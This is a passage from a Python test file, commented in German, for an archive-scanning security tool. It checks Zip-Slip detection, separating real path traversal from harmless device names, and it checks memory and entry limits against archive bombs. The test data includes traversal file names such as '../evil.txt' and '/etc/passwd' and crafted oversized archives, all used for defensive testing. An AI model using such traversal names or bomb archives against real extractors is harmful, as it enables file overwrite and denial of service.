    einzigen Pfad-Escape. Die alte Fassung meldete dafuer
    "Zip-Slip-Versuch" mit Ankergewicht 50 — ROT, "blockieren". Das behauptet
    einen Angriff, den es nicht gibt, und ein Werkzeug, das bei Schlamperei
    "Angriff" ruft, wird bei einem echten Angriff nicht mehr ernst genommen.
    """
    inds = ArchivePipeline().analyze(_ctx(_make_zip({"CON.txt": b"x"})))
    regeln = {i.rule_id: i for i in inds}
    assert "ARCH_ZIPSLIP" not in regeln, "kein Traversal im Archiv"
    assert "ARCH_UNSAFE_NAME" in regeln, sorted(regeln)
    assert regeln["ARCH_UNSAFE_NAME"].weight == 5
    assert regeln["ARCH_UNSAFE_NAME"].severity is Severity.LOW


def test_doppelpunkt_ist_kein_zipslip():
    """Dasselbe fuer NTFS-ADS-Syntax — auf Unix ein gueltiger Dateiname."""
    inds = ArchivePipeline().analyze(_ctx(_make_zip({"normal:stream.txt": b"x"})))
    regeln = {i.rule_id: i for i in inds}
    assert "ARCH_ZIPSLIP" not in regeln
    assert "ARCH_UNSAFE_NAME" in regeln


def test_echter_traversal_behaelt_den_anker():
    """Die Senkung darf die Erkennung nicht aufweichen."""
    for name in ("../evil.txt", "..\\..\\evil.txt", "/etc/passwd", "C:/x.dll"):
        inds = ArchivePipeline().analyze(_ctx(_make_zip({name: b"pwn"})))
        regeln = {i.rule_id: i for i in inds}
        assert "ARCH_ZIPSLIP" in regeln, name
        assert regeln["ARCH_ZIPSLIP"].weight == 50, name


def test_gemischtes_archiv_behaelt_den_anker():
    """Ein Angriff neben harmlosen Merkmalen bleibt ein Angriff."""
    inds = ArchivePipeline().analyze(
        _ctx(_make_zip({"../evil.txt": b"pwn", "CON.txt": b"x"}))
    )
    regeln = {i.rule_id: i for i in inds}
    assert regeln["ARCH_ZIPSLIP"].weight == 50, "der Angriff zaehlt"
    assert regeln["ARCH_ZIPSLIP"].detail.count("evil.txt") == 1
    assert "CON.txt" in regeln["ARCH_UNSAFE_NAME"].detail


def test_tar_meldet_denselben_unterschied():
    """Der TAR-Weg darf nicht anders urteilen als der ZIP-Weg.

    Beide gehen durch denselben Pruefer; die Trennung steht in
    ``core.archive.split_unsafe_names``, damit sie nur an EINER Stelle lebt.
    """
    angriff, mild = split_unsafe_names(["..\\..\\evil.dll", "CON.txt", "normal:stream.txt"])
    assert angriff == ["..\\..\\evil.dll"]
    assert set(mild) == {"CON.txt", "normal:stream.txt"}

    # Und die TAR-Notiz schweigt, wenn bloss ein Geraetename vorliegt.
    assert _zipslip_note(["CON.txt"], complete=True) is None
    assert "Zip-Slip" in (_zipslip_note(["..\\..\\e.dll"], complete=True) or "")


# -- SEC-007/008/009: Mengenbegrenzungen vor dem Entpacken -------------------- #


def test_tar_truncation_check_reads_the_tail_bounded():
    """SEC-007: der Reststrom wird stueckweise geprueft, nicht am Stueck.

    Vorher las ``_tar_truncation_note`` ``tf.fileobj.read()`` ohne Deckel: ein
    32-KB-``.tar.gz`` erzeugte 33,5 MB Rest, eine 2-MB-Datei bis ~4 GB. Hier
    liegen 8 MiB Nicht-Null-Daten hinter dem Endmarker; der Peak muss im
    Chunk-Bereich bleiben.
    """
    raw = (
        _make_tar({"a.txt": b"x"})
        + b"\x00" * 1024
        + b"A" * (8 * 1024 * 1024)
    )
    compressed = gzip.compress(raw)

    tracemalloc.start()
    try:
        members = _members(compressed, "gzip")
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()

    assert any(
        err and err.startswith("Auswertung gestoppt:") and "Endmarker" in err
        for _, _, err in members
    ), members
    assert peak < 2 * 1024 * 1024, (
        f"Peak {peak / (1024 * 1024):.1f} MiB — der Reststrom wurde wieder "
        "am Stueck materialisiert"
    )


def test_failed_members_consume_the_volume_budget(monkeypatch):
    """SEC-008: auch fehlgeschlagene Mitglieder wurden ENTpackt.

    Fuenf 20-MiB-Mitglieder mit manipulierter CRC wurden alle dekomprimiert,
    ohne das Volumen zu belasten (``extracted_total`` wuchs nur im
    Erfolgszweig). Jetzt zaehlt jeder Leseversuch gegen das Budget.
    """
    monkeypatch.setattr(config, "MAX_UNCOMPRESSED_SIZE", 40 * 1024 * 1024)
    entries = {f"f{i}.bin": b"\x00" * (20 * 1024 * 1024) for i in range(3)}
    data = _make_zip(entries)
    for name, payload in entries.items():
        data = _patch_declaration(data, name, len(payload), 0xDEADBEEF)

    members = list(iter_zip_members(data))
    errors = [err for _, _, err in members if err]
    assert any(err.startswith("Auswertung gestoppt:") for err in errors), errors
    assert not any(payload for _, payload, _ in members), (
        "ein Mitglied wurde trotz erschoepftem Budget noch gelesen"
    )


def test_zip_entry_limit_is_checked_before_the_central_directory(monkeypatch):
    """SEC-009: das EOCD-Limit greift, BEVOR ``ZipFile`` alles materialisiert.

    ``ZipFile.__init__`` baut die komplette ``filelist``; die Limit-Pruefung
    IN der Schleife kam zu spaet (100k Eintraege -> 54,7 MiB Peak).
    """
    import malaz.core.archive as archive_mod

    monkeypatch.setattr(config, "MAX_ARCHIVE_ENTRIES", 2)
    data = _make_zip({f"m{i}.txt": b"x" for i in range(5)})

    geoeffnet = []
    echt = archive_mod.zipfile.ZipFile

    def spion(*args, **kwargs):
        geoeffnet.append(args)
        return echt(*args, **kwargs)

    monkeypatch.setattr(archive_mod.zipfile, "ZipFile", spion)

    members = list(iter_zip_members(data))
    assert geoeffnet == [], "ZipFile wurde trotz ueberschrittenem EOCD-Limit geoeffnet"
    assert len(members) == 1
    assert members[0][2] and members[0][2].startswith("Auswertung gestoppt:")
